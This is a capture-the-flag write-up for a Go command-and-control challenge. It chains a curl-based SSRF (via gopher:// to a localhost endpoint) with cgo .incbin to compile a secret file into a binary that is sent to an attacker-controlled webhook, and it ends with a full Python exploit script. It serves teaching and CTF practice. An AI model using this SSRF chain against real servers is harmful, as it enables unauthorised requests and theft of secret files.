# C2 -  SSRF + CGO 

## Source Code Overview

The challenge provides a Go-based C2 server handling agent registration, code execution, and flag retrieval. Key points from the original code:

## Source Code Overview and Key Snippets
### - Agent Registration (/register endpoint):

Accepts JSON data with an "agentUrl" and other agent info, then runs:

```go
cmd := exec.Command("curl", "-sSL", agent.AgentUrl)
```

This makes the server perform an HTTP(S) request to the agent’s URL to verify connectivity.

### - Agent Commands (/agent/{id}/execute endpoint):
Allows POSTing Go source code, which the server compiles (go build) and then uploads the binary to the agent’s URL /exec endpoint using:

```go
err = executeCommandWithTimeout("go", "build", "-ldflags", "-s -w", "-o", binName, fname)

err = executeCommandWithTimeout("curl", "-T", binName, agentExecUrl)
```

## Vulnerabilities & Technical Analysis


### 1. SSRF via curl in /register
When registering an agent, the server runs:
```go
executeCommandWithTimeout("curl", reg.AgentUrl)
```

This causes the server to make an HTTP request to the URL provided by the user.

- Because the server runs curl directly with this URL, any URL scheme supported by curl can be used (e.g., http, https, file, gopher).
- This opens a Server-Side Request Forgery (SSRF) vulnerability allowing us to make the server perform arbitrary requests, including requests to localhost.

### 2. Executing Code on the Server Side

The `/agent/{id}/execute` endpoint accepts Go source code, compiles it, then uploads the binary to the agent's URL:

```go
executeCommandWithTimeout("go", "build", "-ldflags", "-s -w", "-o", binName, fname)
executeCommandWithTimeout("curl", "-T", binName, agentExecUrl)
```

This allows us to run arbitrary Go code on the server agent once we register an agent with a reachable URL.

### 3. Flag is Not Directly Embedded or Accessible

- The server’s current working directory for compiling payloads is a temp directory `/tmp/c2_xxx`, different from `/app/secrets`.
- We cannot use `//go:embed` directive to embed the flag file in our payload because it's outside the compilation directory.
- So we need another way to read `/app/secrets/flag.go`.

### 4. Reading the Flag via CGO

- Using cgo and `__asm__`, we can embed a raw file into the read-only data segment of the compiled binary.
- The assembly directive `.incbin` allows including raw binary data from a file, even outside the compilation directory.
- This way, our payload can contain the flag data embedded at compile time, bypassing directory restrictions.



## Why Use Gopher Protocol for SSRF?

### Background
- The server runs curl `<agentUrl>` during registration.
- We want to send a custom HTTP request to the localhost endpoint `/agent/{id}/execute` on port 8080.
- Normal HTTP SSRF limits us in crafting full request headers and method (e.g., POST with body).
- The target endpoint is localhost-only, so we cannot access it directly externally.
### Gopher Protocol Benefits
- curl supports the `gopher://` protocol, which allows sending arbitrary raw TCP data.
- This lets us fully control the HTTP request bytes, including method, headers, and body.
- Thus, we can craft a raw HTTP POST request with the Go source code payload and send it to `localhost:8080`.
- Using `gopher://localhost:8080/_POST<raw_request>` circumvents the localhost restriction by making the server connect to itself.


## Final Exploit Flow

1. Register a dummy agent with `"agentUrl"` pointing to an attacker-controlled URL (e.g., webhook) just to get an agent ID.
2. Craft a raw HTTP POST request payload with Go code that uses cgo and `__asm__` + `.incbin` to embed `/app/secrets/flag.go`.
3. Encode this raw HTTP request in a `gopher://localhost:8080` URL, pointing to the `/agent/{id}/execute` endpoint on localhost.
4. Register a second agent with agentUrl set to this `gopher://` URL.
5. This triggers the server to call curl on the gopher URL, making the server send the custom POST request to itself locally, compiling and running the payload.
6. The payload extracts the embedded flag and sends it to the attacker.

## Final Exploit Script (Python)

```py
import requests
from urllib.parse import quote

URL = "http://HOST"  # Target server URL

# Step 1: Register dummy agent to get agent_id
register_data = {
    "agentUrl": "https://webhook.site/your-webhook-url",
}
r = requests.post(f"{URL}/register", json=register_data)
agent_id = r.text.strip()
print(f"[+] Registered agent: {agent_id}")

# Step 2: Craft Go payload with cgo __asm__ .incbin directive
payload = """package main
/*
__asm__(
    ".incbin \\"/app/secrets/flag.go\\"\\n"
);
*/
import "C"

func main() {
}
"""

# Step 3: Create raw HTTP POST request targeting /agent/{agent_id}/execute
ssrf = (
    f" /agent/{agent_id}/execute HTTP/1.1\r\n"
    f"Host: localhost\r\n"
    f"Content-Length: {len(payload)}\r\n"
    f"\r\n"
    f"{payload}"
)

# Step 4: Encode raw request as gopher URL
gopherUrl = "gopher://localhost:8080/_POST" + quote(ssrf)

# Step 5: Register new agent with gopher SSRF URL
register_data = {
    "agentUrl": gopherUrl
}
r = requests.post(f"{URL}/register", json=register_data)
print("[+] Payload sent to server.")
print(r.text)

```